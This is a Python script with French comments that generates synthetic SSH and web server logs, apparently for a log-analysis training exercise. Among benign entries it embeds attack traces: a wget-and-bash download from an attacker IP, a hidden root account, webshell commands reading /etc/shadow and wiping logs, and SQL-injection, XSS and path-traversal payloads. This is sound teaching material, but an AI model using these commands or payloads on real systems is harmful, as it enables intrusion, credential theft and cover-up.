"""Génère les journaux synthétiques du module 17 (déterministe)."""
import random, datetime
random.seed(2026)
D0 = datetime.datetime(2026, 11, 16, 6, 0, 0)

def ts(t):  # format syslog
    return t.strftime("%b %d %H:%M:%S")

# ---------- auth.log ----------
ev = []
legit = [("alice", "10.0.0.12"), ("bob", "10.0.0.15"), ("carol", "10.0.0.31"), ("deploy", "10.0.5.2")]
pid = 4000
t = D0
for i in range(70):
    t += datetime.timedelta(seconds=random.randint(200, 900))
    u, ip = random.choice(legit)
    pid += random.randint(1, 30)
    if random.random() < 0.12:
        ev.append((t, f"srv-web sshd[{pid}]: Failed password for {u} from {ip} port {random.randint(40000, 60000)} ssh2"))
        t += datetime.timedelta(seconds=random.randint(5, 20)); pid += 1
    ev.append((t, f"srv-web sshd[{pid}]: Accepted password for {u} from {ip} port {random.randint(40000, 60000)} ssh2"))
    if random.random() < 0.3:
        ev.append((t + datetime.timedelta(seconds=3), f"srv-web sudo:    {u} : TTY=pts/0 ; PWD=/home/{u} ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx"))
    ev.append((t + datetime.timedelta(seconds=random.randint(1, 5)), f"srv-web CRON[{pid + 500}]: pam_unix(cron:session): session opened for user root by (uid=0)"))

# scanner 1 : enumeration d'utilisateurs invalides
t = datetime.datetime(2026, 11, 16, 9, 12, 0)
for u in ["admin", "oracle", "test", "postgres", "ubuntu", "pi", "git", "ftp", "user", "guest", "support", "admin"]:
    t += datetime.timedelta(seconds=random.randint(1, 4)); pid += 1
    ev.append((t, f"srv-web sshd[{pid}]: Invalid user {u} from 45.33.32.156 port {random.randint(30000, 65000)}"))
    ev.append((t, f"srv-web sshd[{pid}]: Failed password for invalid user {u} from 45.33.32.156 port {random.randint(30000, 65000)} ssh2"))

# brute force root (echoue)
t = datetime.datetime(2026, 11, 16, 11, 40, 0)
for i in range(25):
    t += datetime.timedelta(seconds=random.randint(1, 3)); pid += 1
    ev.append((t, f"srv-web sshd[{pid}]: Failed password for root from 185.220.101.4 port {random.randint(30000, 65000)} ssh2"))

# brute force reussi sur 'deploy' depuis 91.92.250.18
t = datetime.datetime(2026, 11, 16, 14, 3, 0)
for i in range(17):
    t += datetime.timedelta(seconds=random.randint(2, 6)); pid += 1
    ev.append((t, f"srv-web sshd[{pid}]: Failed password for deploy from 91.92.250.18 port {random.randint(30000, 65000)} ssh2"))
t += datetime.timedelta(seconds=4); pid += 1
ev.append((t, f"srv-web sshd[{pid}]: Accepted password for deploy from 91.92.250.18 port 51877 ssh2"))
COMPROMISSION = t
ev.append((t + datetime.timedelta(seconds=40), "srv-web sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://91.92.250.18/k.sh -O /tmp/k.sh"))
ev.append((t + datetime.timedelta(seconds=52), "srv-web sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash /tmp/k.sh"))
ev.append((t + datetime.timedelta(seconds=75), "srv-web useradd[9921]: new user: name=sysupdate, UID=0, GID=0, home=/root, shell=/bin/bash"))

# petit brute force lent (sous le seuil)
t = datetime.datetime(2026, 11, 16, 16, 0, 0)
for i in range(6):
    t += datetime.timedelta(minutes=random.randint(5, 15)); pid += 1
    ev.append((t, f"srv-web sshd[{pid}]: Failed password for alice from 203.0.113.77 port {random.randint(30000, 65000)} ssh2"))

ev.sort(key=lambda x: x[0])
auth = "\n".join(f"{ts(t)} {m}" for t, m in ev)

# ---------- access.log ----------
acc = []
pages = ["/", "/index.php", "/actualites", "/contact", "/css/site.css", "/js/app.js", "/img/logo.png", "/produits?id=4", "/produits?id=12", "/login"]
uas = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0 Safari/537.36",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 Version/18.0 Safari/605.1.15",
       "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0"]
clients = [f"82.64.{random.randint(0,255)}.{random.randint(1,254)}" for _ in range(25)]
def al(t, ip, m, path, code, size, ua, ref="-"):
    return (t, f'{ip} - - [{t.strftime("%d/%b/%Y:%H:%M:%S")} +0100] "{m} {path} HTTP/1.1" {code} {size} "{ref}" "{ua}"')
t = D0
for i in range(180):
    t += datetime.timedelta(seconds=random.randint(30, 300))
    ip = random.choice(clients); p = random.choice(pages)
    code = 200 if random.random() > 0.04 else 404
    acc.append(al(t, ip, "GET", p, code, random.randint(300, 40000), random.choice(uas)))
    if p == "/login" and random.random() < 0.5:
        acc.append(al(t + datetime.timedelta(seconds=8), ip, "POST", "/login", 302, 0, random.choice(uas)))
# scanner de répertoires
t = datetime.datetime(2026, 11, 16, 10, 5, 0)
for p in ["/admin", "/administrator", "/wp-login.php", "/wp-admin/", "/.env", "/.git/config", "/backup.zip", "/phpmyadmin/", "/config.php.bak", "/server-status", "/api/v1/users", "/robots.txt", "/.htaccess", "/db.sql", "/old/", "/test.php", "/phpinfo.php", "/uploads/", "/console", "/actuator/health"]:
    t += datetime.timedelta(seconds=1)
    code = 200 if p in ("/robots.txt", "/uploads/") else (403 if p in ("/.htaccess", "/server-status") else 404)
    acc.append(al(t, "198.51.100.23", "GET", p, code, random.randint(150, 600), "Mozilla/5.0 (compatible; Nikto/2.5.0)"))
# sqlmap
t = datetime.datetime(2026, 11, 16, 12, 30, 0)
for p in ["/produits?id=4%27", "/produits?id=4%20AND%201%3D1", "/produits?id=4%20AND%201%3D2", "/produits?id=4%27%20OR%20%271%27%3D%271",
          "/produits?id=4%20UNION%20SELECT%20NULL%2CNULL--", "/produits?id=4%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--",
          "/produits?id=4%3BSELECT%20SLEEP(5)--"]:
    t += datetime.timedelta(seconds=2)
    acc.append(al(t, "203.0.113.9", "GET", p, 500 if "%27" in p and "OR" not in p else 200, random.randint(800, 5000), "sqlmap/1.7.2#stable (https://sqlmap.org)"))
# XSS et traversal
t = datetime.datetime(2026, 11, 16, 13, 10, 0)
acc.append(al(t, "203.0.113.50", "GET", "/recherche?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", 200, 2100, uas[0]))
acc.append(al(t + datetime.timedelta(seconds=30), "203.0.113.50", "GET", "/telecharger?f=..%2F..%2F..%2Fetc%2Fpasswd", 200, 1830, uas[0]))
acc.append(al(t + datetime.timedelta(seconds=45), "203.0.113.50", "GET", "/telecharger?f=..%2F..%2Fconfig%2Fdatabase.yml", 404, 210, uas[0]))
# webshell après compromission
t = COMPROMISSION + datetime.timedelta(minutes=6)
acc.append(al(t, "91.92.250.18", "GET", "/uploads/", 200, 512, "curl/8.4.0"))
for cmd in ["id", "uname%20-a", "cat%20%2Fetc%2Fshadow", "tar%20czf%20%2Ftmp%2Fb.tgz%20%2Fvar%2Fwww", "rm%20-f%20%2Fvar%2Flog%2Fnginx%2Ferror.log"]:
    t += datetime.timedelta(seconds=random.randint(10, 40))
    acc.append(al(t, "91.92.250.18", "POST", f"/uploads/img_2291.php?c={cmd}", 200, random.randint(40, 900), "curl/8.4.0"))
t += datetime.timedelta(seconds=30)
acc.append(al(t, "91.92.250.18", "GET", "/uploads/b.tgz", 200, 48211773, "curl/8.4.0"))
acc.sort(key=lambda x: x[0])
access = "\n".join(l for _, l in acc)

if __name__ == "__main__":
    import sys
    out = sys.argv[1]
    open(out + "/auth.log", "w").write(auth + "\n")
    open(out + "/access.log", "w").write(access + "\n")
    print(len(ev), "lignes auth,", len(acc), "lignes access, compromission", COMPROMISSION)
